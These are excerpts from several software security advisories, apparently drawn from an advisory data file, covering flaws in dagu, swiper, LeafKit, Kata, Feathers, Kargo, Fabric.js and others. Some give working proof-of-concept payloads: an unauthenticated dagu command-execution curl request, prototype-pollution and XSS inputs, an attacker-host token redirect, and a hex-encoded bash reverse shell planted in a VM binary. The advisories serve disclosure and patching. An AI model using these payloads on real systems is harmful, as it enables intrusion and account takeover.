The root and all issuing certificates are assumed to be valid during the leaf certificate's validity. An issuing certificate with a validity that expires before the leaf certificate will be considered valid during verification even if the provided timestamp would mean the issuing certificate should be considered expired.\n\n## Impact\n\nNo impact to users of the public Sigstore infrastructure. This may affect private deployments with customized PKIs. In practice, this is unlikely to occur as CAs should not be issuing certificates that outlive the validity of the CA and its parents.\n\n## Workarounds\n\nUpgrade to the latest release, or verify the certificate chain out of band.\n\n## Example to Reproduce\n\n* Root CA certificate is valid from 12pm-2pm\n* Intermediate CA certificate is valid from 12:30pm-1:30pm\n* Leaf certificate is valid from 1pm-3pm - **Note that this is unlikely to happen in practice**, as a CA shouldn't issue a certificate that would be valid after the issuing CA certificate expires\n* Signature generated at 2:30pm with a signed timestamp\n* During verification, the leaf certificate's not before time (1pm) is used to verify the chain - 1pm is in the validity windows for the root and intermediate CA certificates\n* The timestamp's time is checked to be in the validity window of only the leaf certificate - 2:30pm is in the validity window for the leaf\n* Even though the root and intermediate would be expired at 2:30pm, verification succeeds",

File-oriented flags are blocked for safe-bin mode (for example `sort -o`, `jq -f`, `grep -f`), and trusted-path checks remain enforced.\n\n## Fix Commit(s)\n- `bafdbb6f112409a65decd3d4e7350fbd637c7754`\n\nThanks @nedlir for reporting.",

When processing untrusted JSON input, this behavior may allow an attacker to instantiate arbitrary classes available in the application.\n\nIf a vulnerable application passes attacker-controlled JSON into JsonSerializer::unserialize() and contains classes with dangerous magic methods (such as `__wakeup()` or `__destruct()`), this may lead to PHP Object Injection and potentially Remote Code Execution (RCE), depending on available gadget chains in the application or its dependencies.\n\nThis behavior is similar in risk profile to PHP's native `unserialize()` when used without the `allowed_classes` restriction.\n\n### Impact\n\nThis vulnerability allows instantiation of arbitrary PHP classes via the `@type` field when deserializing JSON.\n\nApplications are impacted only if:\n* Untrusted or attacker-controlled JSON is passed into `JsonSerializer::unserialize()`, and\n* The application or its dependencies contain classes that can be leveraged as a gadget chain.\n\nSuccessful exploitation may lead to:\n* Arbitrary code execution\n* Data exfiltration\n* File manipulation\n* Denial of service\n\nApplications that only deserialize trusted data are not affected.\n\n### Patches\n\nThis issue is mitigated in version 3.2.3.\n\nVersion 3.2.3 introduces the method: `setAllowedClasses(?array $allowedClasses)`\n\nThis allows applications to restrict which classes may be instantiated during deserialization, similar to PHP's native `unserialize()` `allowed_classes` option.\n\nUsers should upgrade to version 3.2.3 or later and configure an appropriate class allowlist.\n\n### Workarounds\n\nIf upgrading is not immediately possible, applications should ensure that:\n* `JsonSerializer::unserialize()` is never called on untrusted or attacker-controlled JSON.\n* JSON input is validated and sanitized before deserialization.\n* Object instantiation via `@type` is disabled in application logic where possible.\n\nAfter upgrading, users can mitigate risk by explicitly configuring:\n\n```php\n$serializer->setAllowedClasses([]);\n```\n\nto disable all object instantiation, or by providing a strict allowlist of safe classes.\n\n### References\n\n* CWE-502: https://cwe.mitre.org/data/definitions/502.html\n* PHP `unserialize()` documentation: https://www.php.net/manual/en/function.unserialize.php\n* OWASP PHP Object Injection: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection",

The `POST /api/v2/dag-runs` endpoint accepts an inline YAML spec and executes its shell commands immediately — no credentials, no token, nothing. Any dagu instance reachable over the network is fully compromised by default. A second issue means that even with auth properly configured, operator-role users can still execute arbitrary commands by submitting inline specs through the same endpoint.\n\n### Details\n\n**Finding 1 — Unauthenticated RCE (default config)**\n\n`internal/service/app/config/loader.go:226` sets `AuthModeNone` as the default. With no auth mode configured, `internal/frontend/api/v2/handlers/api.go:520` returns nil from `requireExecute()` — all permission checks pass without a valid session.\n\nThe `POST /api/v2/dag-runs` endpoint accepts a `spec` field containing a full YAML DAG definition. The spec is loaded, the steps are parsed, and the commands execute immediately on the host. There is no validation of the spec content beyond YAML parsing.\n\nTested on `ghcr.io/dagu-org/dagu:latest` — the endpoint responds with a `dagRunId` and the command runs within milliseconds.\n\n**Finding 2 — Operator role privilege escalation (auth-enabled instances)**\n\n`internal/frontend/api/v2/handlers/dagruns.go:56` guards the dag-runs endpoint with `requireExecute()`. The operator role has `CanExecute=true` but `CanWrite=false` (`internal/auth/role.go:63-69`) — operators are supposed to run existing DAGs, not create new ones.\n\nBut submitting an inline spec to `POST /api/v2/dag-runs` is effectively a create-and-execute operation. The endpoint never calls `requireDAGWrite()`. So an operator can paste arbitrary shell commands into the spec field and execute them — the same result as admin — while being correctly blocked from `POST /api/v2/dags`. This applies even when authentication is fully enabled and correctly configured.\n\n**Finding 3 — Backtick command injection in step parameters**\n\n`internal/cmn/eval/substitute.go:57-78` evaluates backtick-delimited expressions in step parameter values by passing them to `sh -c`. There is no sanitization on parameter values before they reach this function. Any user who can trigger a DAG run with custom parameters can inject arbitrary commands via backtick substitution.\n\n### PoC\n\nFinding 1 — no credentials needed, works on any default install:\n\n```bash\ncurl -s -X POST http://TARGET:8080/api/v2/dag-runs \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"poc\",\"spec\":\"steps:\\n  - name: rce\\n    command: id > /tmp/pwned\\n\"}'\n\n# Response: {\"dagRunId\":\"<uuid>\"}\n# /tmp/pwned contains: uid=1000(dagu) gid=1000(dagu) groups=1000(dagu)\n```\n\nTested and confirmed on the default Docker image with no configuration changes.\n\n### Impact\n\nEvery dagu deployment using default settings — which is every Docker deployment, every install following the documentation, and every instance without explicit `DAGU_AUTH_MODE` configuration — is fully compromised without credentials. An attacker with network access gets OS command execution as the dagu process user and access to everything the process can reach.\n\nFinding 2 means the problem doesn't fully go away by enabling auth. Operator-level accounts can still escalate to arbitrary command execution regardless of the auth configuration.",

Inputs like `../../...` or absolute paths could escape the working directory in non-sandboxed mode.\n\n## Impact\n\nPractical impact depends on deployment and who can trigger tool execution. This is most relevant when tool invocation is exposed to less-trusted callers or when operators expected workspace-only containment.\n\n## Workarounds\n\n- Keep `tools.exec.applyPatch.enabled` disabled if you do not need `apply_patch`.\n- Keep `tools.exec.applyPatch.workspaceOnly` at its secure default of `true`.\n- Restrict who can trigger tool execution (and which tools are allowlisted).\n\n## Configuration Note\n\n`tools.exec.applyPatch.workspaceOnly: false` intentionally opts out of workspace containment and can re-enable outside-workspace writes/deletes.\n\n## Fix\n\n- PR: https://github.com/openclaw/openclaw/pull/16405\n- Merge commit: `5544646a09c0121fca7d7093812dc2de8437c7f1`\n\n## Credits\n\nThanks to @p80n-sec for reporting this issue.",

This leads to full account takeover, as the attacker obtains the victim's access token and can impersonate them.\n\nThe application constructs the final redirect URL by concatenating the base origin with the user-supplied `redirect` parameter:\n```javascript\n// https://github.com/feathersjs/feathers/blob/dove/packages/authentication-oauth/src/service.ts#L158C3-L176C4\nconst { redirect } = query;\n...\nsession.redirect = redirect;\n\n// https://github.com/feathersjs/feathers/blob/dove/packages/authentication-oauth/src/strategy.ts#L98\nconst redirectUrl = `${redirect}${queryRedirect}`;\n```\n\nWhere:\n- `redirect` = base origin from config (e.g., `https://target.com`)\n- `queryRedirect` = user input from `?redirect=` parameter\n\nThis is exploitable when the `origins` array is configured and origin values do not end with `/`.  An attacker can supply `@attacker.com` as the redirect value results in `https://target.com@attacker.com#access_token=...`, where the browser interprets `attacker.com` as the host, leading to full account takeover.\n\n**Credits**:  Abdelwahed Madani Yousfi (@vvxhid) / Edoardo Geraci (@b0-n0-b0) / Thomas Rinsma (@ThomasRinsma) From Codean Labs.",

As a result, an authenticated user with the editor role can create a new account with administrative privileges, leading to full administrative access and complete compromise of the CMS.\n\n### Impact\n\nSuccessful exploitation allows an attacker to:\n- Gain full administrative control over the CMS.\n- Access all site data and user information.  \n- Modify system configuration and security settings.\n- Create, modify, or delete any user account, including legitimate administrators.\n\n### Patches\n\n[Formwork 2.3.4](https://github.com/getformwork/formwork/releases/tag/2.3.4)  properly assigns roles on user creation.",

          "html": "### Summary\nA prototype pollution vulnerability exists in the the npm package swiper (>=6.5.1, < 12.1.2). Despite a previous fix that attempted to mitigate prototype pollution by checking whether user input contained a forbidden key, it is still possible to pollute `Object.prototype` via a crafted input using Array.prototype. The exploit works across Windows and Linux and on Node and Bun runtimes. This issue is fixed in version 12.1.2\n\n### Details\nThe vulnerability resides in line 94 of shared/utils.mjs where indexOf() function is used to check whether user provided input contain forbidden strings.\n\n### PoC\n#### Steps to reproduce\n1. Install latest version of swiper using npm install \n2. Run the following code snippet:\n```javascript\nvar swiper = require('swiper');\nArray.prototype.indexOf = () => -1;        \nlet obj = {};\nvar malicious_payload = '{\"__proto__\":{\"polluted\":\"yes\"}}';\nconsole.log({}.polluted);\nswiper.default.extendDefaults(JSON.parse(malicious_payload));\nconsole.log({}.polluted);  // prints yes -> indicating that the patch was bypassed and prototype pollution occurred\n```\n\n#### Expected behavior\nPrototype pollution should be prevented and {} should not gain new properties.\nThis should be printed on the console:\n```\nundefined\nundefined OR throw an Error\n```\n\n#### Actual behavior\nObject.prototype is polluted\nThis is printed on the console:\n```\nundefined \nyes\n```\n\n### Impact\nThis is a prototype pollution vulnerability, which can have severe security implications depending on how swiper is used by downstream applications. Any application that processes attacker-controlled input using this package may be affected.\nIt could potentially lead to the following problems:\n1. Authentication bypass\n2. Denial of service - Even if an attacker is not able to exploit prototype pollution in swiper, if there is a prototype pollution within the project from other dependencies, modifying global `Array.prototype.indexOf` property can result in crash when swiper.default.extendDefaults is called because swiper makes use of this global property. This can lead to Denial of Service.  \n3. Remote code execution (if polluted property is passed to sinks like eval or child_process)\n\n### Related CVEs\n[CVE-2026-25521](https://github.com/advisories/GHSA-rxrv-835q-v5mh)\n[CVE-2026-25047](https://github.com/advisories/GHSA-2733-6c58-pf27)\n[CVE-2026-26021](https://github.com/advisories/GHSA-2c4m-g7rx-63q7)",

This means the comparison time can slightly vary depending on how many characters match.\n\nUnder very specific and controlled conditions, this behavior could theoretically allow timing-based analysis.\n\nThe implementation has been updated to:\n\n- Avoid early termination during comparison\n- Use a constant-time-style comparison method\n\n## Impact\n\nThis issue is unlikely to be exploited in normal environments.\n\nIt may only be relevant in highly controlled situations where precise timing measurements are possible.\n\nThis change is considered a security hardening improvement.

In the case of html attributes, this can lead to XSS if there is a leaf variable in the attribute that is user controlled.\n\n### Details\n\nRelevant code:\nhttps://github.com/vapor/leaf-kit/blob/main/Sources/LeafKit/String%2BHTMLEscape.swift#L14\n\nStrings in Swift are based on extended grapheme clusters. HTML on the other hand is based on unicode characters. \n\nFor example if you have the sequence \"́  (U+0022 Quotation mark followed by U+0301 Combining Acute Accent). To HTML this is just a quote mark followed by some other random character. To swift this is one extended grapheme cluster that does not equal a quotation mark by itself which is a different extended grapheme cluster.\n\nThus `\"\\\"́\".replacingOccurrences(of: \"\\\"\", with: \"&quot;\")` does not replace the quote mark. This allows you to break out of html attributes.\n\nI believe replacingOccurences takes an optional third parameter that allows you to specify options to make it work on UTF-8 characters instead of grapheme clusters, which would be a good fix for this issue.\n\nI see depending on version, leafkit might use `replacing` instead of `replacingOccurences`. I don't know swift that well and couldn't find docs on what replacing does, so I don't know if both versions of the function are affected. The version of swift i was testing on I believe was using replacingOccurences\n\nIt seems like replacingOccurences will skip past prefix characters of extended grapheme clusters, which is what would be needed in order to meaningfully bypass esaping of <. Thus i think this is mostly limited to attributes and not general text.\n\n### PoC\n\nAn example vapor application that is vulnerable might look like\n\nroutes.swift\n```swift\nimport Vapor\n\nstruct Hello: Content {\n    var msg: String?\n}\n\nfunc routes(_ app: Application) throws {\n    app.post { req throws in\n\tlet Hello = try req.content.decode(Hello.self)\n        return req.view.render(\"hello\", [\n            \"msg\": Hello.msg ?? \"Hello World!\"\n        ])\n    }\n}\n```\n\nWith a hello.leaf that looks like\n```\n<div title=\"#(msg)\">Hover to see message</div>\n```\n\nAnd then you POST something like `msg=%22%cc%81=1%20autofocus%20tabindex=0%20onfocus=alert(1)%20`\n\n### Impact\nIf a website uses leaf to escape an attribute value based on user input, the attacker may be able to insert a malicious attribute. If a site is not using a secure CSP policy, then this can be used to execute malicious javascript (XSS). Impact is context dependent if a site is using a secure CSP policy.",

The following procedure has been validated strictly within a local 'Kind' environment and has not undergone exhaustive testing across diverse production architectures. Proceed with caution.\n\nTo mitigate the identified traffic bypass, ensure all ingress traffic from the `cilium_wg0` interface is explicitly routed to `cilium_host` for policy enforcement. This ensures that host-level security policies are applied to decrypted WireGuard traffic. Execute the following configuration on each CiliumNode:\n\n```bash\n# IPv4 Traffic\nip rule add iif cilium_wg0 table 300\nip route add default dev cilium_host table 300\n\n# IPv6 Traffic\nip -6 rule add iif cilium_wg0 table 300\nip -6 route add default dev cilium_net table 300\n```\n\n### Acknowledgements\n\nSpecial thanks to @julianwiedmann for reporting the issue and helping with the resolution.\n\n### For more information\n\nIf you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at security@cilium.io. This is a private mailing list for the Cilium security team, and your report will be treated as top priority. Please also address any comments or questions on this advisory to the same mailing list.",

          "html": "### Summary\n\nAn issue in Kata with Cloud Hypervisor allows a user of the container to modify the file system used by the Guest micro VM ultimately achieving arbitrary code execution as root in said VM. The current understinding is this doesn’t impact the security of the Host or of other containers / VMs running on that Host (note that arm64 QEMU lacks NVDIMM read-only support: It is believed that until the upstream QEMU gains this capability, a guest write could reach the image file).\n\n### Details\n\n_Linux virtio-pmem_\nThe `virtio-pmem` probe path always registers the region as a generic pagemap that supports asynchronous flushes, but it never marks the region as read-only.  Only the `ND_REGION_PAGEMAP` and `ND_REGION_ASYNC` bits are set before the region is created, so `nd_region->ro always` stays cleared and the block device is left writable.\n\nLater, `pmem_attach_disk()` wires the region into the block layer with full read/write semantics – the block device operations call `pmem_do_write()` which performs cache-flushed memcpy operations directly into the host-provided shared memory window. `nvdimm_check_and_set_ro()` would set the disk read-only if the region had been flagged as such, but because `virtio_pmem` never sets that flag, the helper becomes a no-op.\n\n_Cloud-Hypervisor virtio_pmem_\n`discard_writes=on` causes the file backing the `virtio-pmem` device to be opened read-only and mapped with `MAP_PRIVATE` rather than `MAP_SHARED`. That combination means the guest can modify the private copy of the mapped pages, but those modifications never propagate back to the underlying file. The guest (and Cloud Hypervisor process) will still read the modified data because it lives in the private copy of the mapping, so write-then-read sequences appear to succeed even though nothing is persisted. Once the mapping is dropped or the VM is restarted, those copy-on-write changes disappear, leaving the backing file unchanged.\n\n_Kata /dev/pmem0_\nKata boots each pod/VM by DAX-mapping a read-only guest image from the host into the VM and telling the guest kernel to mount the resulting `/dev/pmem*` device as its root filesystem.\nSince DAX maps the backing file directly into guest memory, there is no way for the hypervisor to intercept or reject individual stores, so a container with sufficient permissions can open `/dev/pmem0` and observe its own writes until the VM is rebooted or the cache is dropped.\n\n### PoC\n\nWhen putting all this together, this means that a user of a Container (not necessarily privileged, we don’t need `CAP_SYS_ADMIN`, but we need `CAP_MKNOD`) can modify the Guest OS filesystem, replacing libraries or binaries to achieve arbitrary code execution outside of the Container. This requires computing offsets of files within the device, which requires information like the partition start sector, sector size in bytes, the filesystem block size, and the physical block index of the file.\n\nTo achieve execution on the Guest, I replaced `/usr/bin/systemd-tmpfiles` with a connect-back shell to `localhost`: timers end up executing 15min after boot.\nI use `debugfs` to not require mounting privileges and work directly with the filesystem on `/dev/pmem0p1` to get the absolute offset of the file to modify in the device.\n\nIf you want a simpler PoC, just `dd` write something into `/dev/pmem0` and observe it's `dd` readable until discarded.\n\n```\nroot@ab5392da44ce:~# mknod /dev/pmem0 b 259 0\nroot@ab5392da44ce:~# mknod /dev/pmem0p1 b 259 1\nroot@ab5392da44ce:~# python pmem.py --file /usr/bin/systemd-tmpfiles --write --pattern 23212f62696e2f626173680a62617368202d69203e26202f6465762f7463702f3132372e302e302e312f34343320303e26310a6578697420300a\n=== Resolution ===\nPartition device:         /dev/pmem0p1 (pmem0p1)\nPartition start (sectors): 2048\nSector size (bytes):       512\nPartition start (bytes):   1048576\nFilesystem block size:     4096\nFile path:                 /usr/bin/systemd-tmpfiles\nFile offset (bytes):       0\nLogical block index:       0\nIntra-block offset:        0\nPhysical block index:      40668\n→ Absolute pmem offset:    167624704\n[*] Raw read (64 bytes at 167624704):\n09fdc000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00 |.ELF............|\n09fdc010  03 00 3e 00 01 00 00 00  20 66 00 00 00 00 00 00 |..>..... f......|\n09fdc020  40 00 00 00 00 00 00 00  48 82 01 00 00 00 00 00 |@.......H.......|\n09fdc030  00 00 00 00 40 00 38 00  0d 00 40 00 20 00 1f 00 |....@.8...@. ...|\n[+] Wrote 58 bytes at absolute offset 167624704.

The published package contains a modified package.json with an added postinstall script:\n`\"postinstall\": \"npm install -g openclaw@latest\"`\nThis causes openclaw (an unrelated, non-malicious open source package) to be globally installed when cline@2.3.0 is installed. No other files were modified -- the CLI binary (dist/cli.mjs) and all other package contents are identical to the legitimate cline@2.2.3 release.\nA corrected version (2.4.0) was published at 11:23 AM PT and 2.3.0 was deprecated at 11:30 AM PT. The compromised token has been revoked and npm publishing now uses OIDC provenance via GitHub Actions.\n\n### Impact\nUsers who installed Cline CLI cline@2.3.0 during the approximately 8-hour window between 3:26 AM PT and 11:30 AM PT on February 17 will have openclaw globally installed. The openclaw package is a legitimate open source project and is not malicious, but its installation was not authorized or intended.\n\nThe Cline VS Code extension and JetBrains plugin were not affected. This advisory applies only to the Cline CLI package published on npm.\n\n### Patches\nVersions 2.4.0 and higher are fixed\n\n### Workarounds\nIf you installed Cline CLI cline@2.3.0:\n1. Update to the latest version of the Cline CLI\n`cline update` or `npm installl -g cline@latest`\n2. Verify that you have a fixed version (2.4.0 or higher)\n`cline --version`\n3. Review your environment for any unexpected installation of OpenClaw and remove it if not intended\n`npm uninstall -g openclaw`",

          "html": "## Summary\n\nThe batch resource creation endpoints of both Kargo's legacy gRPC API and newer REST API accept multi-document YAML payloads. When either endpoint creates a `Project` resource, creation of subsequent resources from that same payload belonging in that Project's underlying Kubernetes namespace, by design, proceeds using the API server's own permissions. The creator of a new Project automatically becomes its administrator, but those permissions are granted asynchronously by the management controller. The design choice to create the affected resources using the API server's own permissions averts a race and is contextually appropriate.\n\nSpecially crafted payloads can manifest a bug present in the logic of both endpoints to inject arbitrary resources (of specific types only) into the underlying namespace of an _existing_ Project using the API server's own permissions when that behavior was _not_ intended. Critically, an attacker may exploit this as a vector for elevating their own permissions, which can then be leveraged to achieve remote code execution or secret exfiltration. Exfiltrated artifact repository credentials can be leveraged, in turn, to execute further attacks.\n\nIn some configurations of the Kargo control plane's underlying Kubernetes cluster, elevated permissions may additionally be leveraged to achieve remote code execution or secret exfiltration using `kubectl`. This can reduce the complexity of the attack, however, worst case scenarios remain entirely achievable even without this.\n\n## Base Metrics\n\nThe following sections provide the rationale for the values selected for each of CVSS v4's base metrics.\n\n### Attack Vector (AV): Network\n\nThe affected endpoints are served by the Kargo API server over HTTP/HTTPS. No local or physical access is required.\n\n### Attack Complexity (AC): Low\n\nExploitation requires only a specially crafted YAML payload sent to an affected API endpoint.\n\n### Attack Requirements (AT): None\n\nNo specific environmental conditions are required beyond those that are typical for any Kargo instance.\n\n### Privileges Required (PR): Low\n\nThe attack relies only on the ability to authenticate to the Kargo API server along with basic permissions that are typically granted to all Kargo users.\n\n### User Interaction (UI): None\n\nThe attack is fully automated via API calls. No other user needs to take any action.\n\n### Confidentiality Impact to Vulnerable System (VC): High\n\nElevated permissions enable secret exfiltration from any Kargo Project.\n\n### Integrity Impact to Vulnerable System (VI): High\n\nElevated permissions enable tampering, up to and including remote code execution, as well as secret exfiltration from any Kargo Project. Project secrets often include credentials having write permissions to GitOps repositories. Such secrets may enable pushing configurations that impact the integrity of the vulnerable system, including Kargo Projects, Kargo control plane components, and the Kargo control plane's underlying Kubernetes cluster.\n\nNote: Because it is an integral component of Kargo's control plane, the underlying Kubernetes cluster has been counted as a component of the vulnerable system instead of a subsequent system.\n\n### Availability Impact to Vulnerable System (VA): High\n\nElevated permissions enable tampering, up to and including remote code execution, as well as secret exfiltration from any Kargo Project. Project secrets often include credentials having write permissions to GitOps repositories. Such secrets may enable pushing configurations that impact the availability of the vulnerable system, including Kargo control plane components and the Kargo control plane's underlying Kubernetes cluster.\n\n### Confidentiality Impact to Subsequent Systems (SC): High\n\nSecrets exfiltrated from Project namespaces typically contain credentials for external systems. These may enable exfiltration of further confidential information from those systems.\n\n### Integrity Impact to Subsequent Systems (SI): High\n\nElevated permissions enable tampering, up to and including remote code execution, as well as secret exfiltration from any Kargo Project. Project secrets often include credentials having write permissions to GitOps repositories. Such secrets may enable pushing configurations that impact the integrity of subsequent systems.\n\n### Availability Impact to Subsequent Systems (SA): High\n\nElevated permissions enable tampering, up to and including remote code execution, as well as secret exfiltration from any Kargo Project. Project secrets often include credentials having write permissions to GitOps repositories. Such secrets may enable pushing configurations that impact the availability of subsequent systems.\n\n## Mitigating Factors\n\n- Exploitation requires authentication to the Kargo API server. Anonymous access is not sufficient.\n\n- The most severe consequences of this vulnerability depend on a privilege escalation path (via `RoleBinding` injection) that was not identified by the original reporter, suggesting it is not immediately obvious from the bug alone.\n\n- There is no evidence of exploitation in the wild.",

          "html": "## Summary\n\nKargo's authorization model includes a `promote` verb -- a non-standard Kubernetes [\"dolphin verb\"](https://www.aquasec.com/blog/kubernetes-verbs/) -- that gates the ability to advance `Freight` through a promotion pipeline. This verb exists to separate the ability to _manage_ promotion-related resources from the ability to _trigger_ promotions, enabling fine-grained access control over what is often a sensitive operation.\n\nThe `promote` verb is correctly enforced in Kargo's legacy gRPC API. However, three endpoints in the newer REST API omit this check, relying only on standard Kubernetes RBAC for the underlying resource operations (`patch` on `freights/status` or `create` on `promotions`). This permits users who hold those standard permissions -- but who were deliberately _not_ granted `promote` -- to bypass the intended authorization boundary.\n\nThe affected endpoints are:\n\n1. `POST /v1beta1/projects/{project}/freight/{freight}/approve`\n\n    Approves `Freight` for promotion to a specific `Stage`.\n\n    The endpoint is intended to require both `patch` permission on `Freight` status and `promote` permission on the target `Stage`, but asserts only the former.\n\n2. `POST /v1beta1/projects/{project}/stages/{stage}/promotions`\n\n    Promotes `Freight` to a specific `Stage`.\n\n    The endpoint is intended to require both `create` permission on `Promotion` resources and `promote` permission on the target `Stage`, but asserts only the former.\n\n3. `POST /v1beta1/projects/{project}/stages/{stage}/promotions/downstream`\n\n    Promotes `Freight` to all `Stage`s immediately downstream of a given `Stage`.\n\n    The endpoint is intended to require both `create` permission on `Promotion` resources and `promote` permission on each downstream `Stage`, but asserts only the former.\n\n## Base Metrics\n\nThe following sections provide the rationale for the values selected for each of CVSS v4's base metrics.\n\n### Attack Vector (AV): Network\n\nThe affected endpoints are part of Kargo's newer REST API, which is served over HTTP/HTTPS. (The analogous endpoints of the legacy gRPC API correctly check `promote` permission and are not affected.) No local or physical access is required.\n\n### Attack Complexity (AC): Low\n\nThe attack requires only well-formed API requests to the affected endpoints.\n\n### Attack Requirements (AT): None\n\nNo specific environmental conditions are required beyond those that are typical for any Kargo instance.\n\n### Privileges Required (PR): Low\n\nThe attacker must hold permissions to patch `Freight` status and/or create `Promotion` resources. These are standard operational permissions commonly granted to some Kargo users and do not represent what CVSS formally considers administrative or elevated access.\n\n### User Interaction (UI): None\n\nThe attack is fully automated via API calls. No other user needs to take any action.\n\n### Confidentiality Impact to Vulnerable System (VC): None\n\nThe vulnerability does not expose any data from the Kargo control plane.\n\n### Integrity Impact to Vulnerable System (VI): Low\n\nThe attacker can coerce a `Stage` into a state it might not otherwise transition to. This constitutes bounded state corruption within a single Project. Kargo itself continues to function correctly.\n\n### Availability Impact to Vulnerable System (VA): None\n\n`Promotion` resources created by exploitation of this vulnerability consume the same controller resources as a legitimate `Promotion` would. A user with proper `promote` permissions could generate identical load. The vulnerability does not introduce any new avenue for resource exhaustion.\n\n### Confidentiality Impact to Subsequent Systems (SC): None\n\nThe vulnerability does not provide any mechanism for the attacker to read data from downstream systems.\n\n### Integrity Impact to Subsequent Systems (SI): Low\n\nCritically, the attacker does not control the _content_ of `Freight` resources without artifact repositories also having been compromised. In isolation, which is how vulnerabilities are scored, the worst consequence of a successful attack is downstream systems (e.g. Argo CD) deploying incorrect revisions of artifacts, which in some cases should have been rejected by bypassed segments of the promotion pipeline. Though the operational consequences land on subsequent systems, they are bounded by the attacker's inability to inject arbitrary content.\n\n### Availability Impact to Subsequent Systems (SA): None\n\nThe attack does not provide any mechanism to degrade the availability of downstream systems beyond what could be achieved with legitimately promoted `Freight`.\n\n## Mitigating Factors\n\n- Only the REST API endpoints introduced in v1.9.0 are affected. The legacy gRPC API and the Kargo UI (which uses the gRPC API) correctly enforce the `promote` permission check and are not vulnerable.\n\n- The window of affected versions is narrow: v1.9.0 through v1.9.2.\n\n- Exploitation requires authentication to the Kargo API server and specific operational permissions (`patch` on `freights/status` or `create` on `promotions`). Anonymous or minimally privileged users cannot exploit this vulnerability.\n\n- Impact is bounded to a single Project. The `promote` bypass does not enable cross-Project access or escalation beyond the namespace in which the attacker already holds the prerequisite permissions.\n\n- There is no evidence of exploitation in the wild.",

When attacker-controlled JSON is loaded via `loadFromJSON()` and later exported via `toSVG()`, the unescaped values break out of XML attributes and inject arbitrary SVG elements including event handlers.\n\n### Deserialization Path (no sanitization)\n\n`loadFromJSON()` (`src/canvas/StaticCanvas.ts:1229`) calls `enlivenObjects()` which calls `_fromObject()` (`src/shapes/Object/Object.ts:1902`). `_fromObject` passes all deserialized properties to the shape constructor via `new this(enlivedObjectOptions)`. The constructor ultimately calls `_setOptions()` (`src/CommonMethods.ts:9`) which iterates over every property and assigns it to the object via `this.set(prop, options[prop])`. There is no allowlist or sanitization - any property in the JSON, including `id`, is set verbatim on the fabric object.\n\n---\n\n### Finding 1: XSS via `id` Property Injection \n\nThe `id` property from deserialized JSON is interpolated directly into SVG attribute strings without escaping.\n\n**Vulnerable code (`src/shapes/Object/FabricObjectSVGExportMixin.ts`, line 89, `getSvgCommons()`):**\n```typescript\ngetSvgCommons(\n  this: FabricObjectSVGExportMixin & FabricObject & { id?: string },\n) {\n  return [\n    this.id ? `id=\"${this.id}\" ` : '',  // <-- unescaped, user-controlled\n    this.clipPath\n      ? `clip-path=\"url(#${...})\" `\n      : '',\n  ].join('');\n}\n```\n\nThis method is called in `_createBaseSVGMarkup()` (same file, line 178) which wraps every object's SVG output in a `<g>` element. Every fabric object type (Rect, Circle, Path, Text, Image, Group, etc.) inherits this mixin, so the `id` injection vector applies to all object types.\n\n**Contrast with text content, which IS escaped:**\n```typescript\n// src/shapes/Text/TextSVGExportMixin.ts:186\nreturn `<tspan ...>${escapeXml(char)}</tspan>`;\n```\n\nThe inconsistency shows that the intention was to prevent injection but was missed w attribute contexts.\n\n---\n\n### Finding 2: XSS via Image `src` / `xlink:href` Injection \n\nImage source URLs are interpolated raw into `xlink:href` in `_toSVG()`.\n\n**Vulnerable code (`src/shapes/Image.ts`, line 404, `_toSVG()`):**\n```typescript\nimageMarkup.push(\n  '\\t<image ',\n  'COMMON_PARTS',\n  `xlink:href=\"${this.getSvgSrc(true)}\" x=\"${x - this.cropX}\" y=\"${\n    y - this.cropY\n  }\" ...`  // <-- unescaped\n);\n```\n\n`getSvgSrc()` returns the image `src` property which is set from JSON during deserialization. An attacker can inject a `src` value that breaks out of the `xlink:href` attribute.\n\n---\n\n### Finding 3: XSS via Pattern `sourceToString()` \n\n**Vulnerable code (`src/Pattern/Pattern.ts`, line 181, `toSVG()`):**\n```typescript\n`<image x=\"0\" y=\"0\" ... xlink:href=\"${this.sourceToString()}\"></image>`\n// <-- unescaped, returns this.source.src for image sources\n```\n\nAdditionally, Pattern's constructor (`line 92–94`) runs `this.id = uid()` *before* `Object.assign(this, options)`, meaning a user-supplied `id` in the pattern JSON overwrites the auto-generated uid. The pattern `id` is then interpolated unescaped on line 180:\n```typescript\n`<pattern id=\"SVGID_${id}\" x=\"${patternOffsetX}\" ...>`\n```\n\n---\n\n### Finding 4: Gradient `id` Partial Injection (lower Severity)\n\n**Vulnerable code (`src/gradient/Gradient.ts`, line 212, `toSVG()`):**\n```typescript\n`id=\"SVGID_${this.id}\"`  // <-- unescaped\n```\n\nGradient's constructor (`line 125`) computes `id: id ? `${id}_${uid()}` : uid()`. If a user-supplied `id` is present in the gradient JSON, it is prepended to the auto-generated uid. The user-controlled portion is interpolated unescaped into the SVG. This is exploitable but the payload is constrained by the `_<uid>` suffix appended after it.\n\n---\n\n## Impact\n\nAny application that:\n1.

A crafted value containing `</script>` could break out of the script tag and execute attacker-controlled JavaScript in the Control UI origin.\n\n## Affected Packages / Versions\n- Package: `openclaw` (npm)\n- Affected versions: `<= 2026.2.14`\n- Fixed in: `>= 2026.2.15` (next release; fix is already merged on `main`)\n\n## Details\nThe gateway Control UI HTML response previously injected `assistantName` and `assistantAvatar` directly into an inline `<script>` block using `JSON.stringify(...)`. `JSON.stringify` does not prevent `</script>` from terminating the script element, enabling stored XSS if an operator/admin sets the assistant identity to a malicious string.\n\nOpenClaw’s Control UI is intended for local use only (see `SECURITY.md`); this advisory’s CVSS reflects a loopback-only/local-access deployment assumption.\n\n## Impact\nAn attacker with the ability to set assistant identity values (config or agent identity) could cause JavaScript execution for Control UI visitors, enabling token/session theft and privileged actions in the UI.\n\n## Fix\n- Removed inline script injection and serve bootstrap config from a JSON endpoint.\n- Added a restrictive Content Security Policy for the Control UI (`script-src 'self'`, no inline scripts).\n\n## Fix Commit(s)\n- `adc818db4a4b3b8d663e7674ef20436947514e1b`\n- `3b4096e02e7e335f99f5986ec1bd566e90b14a7e`\n\n## Release Process Note\nThis advisory pre-sets the patched version to the planned next release (`2026.2.15`).

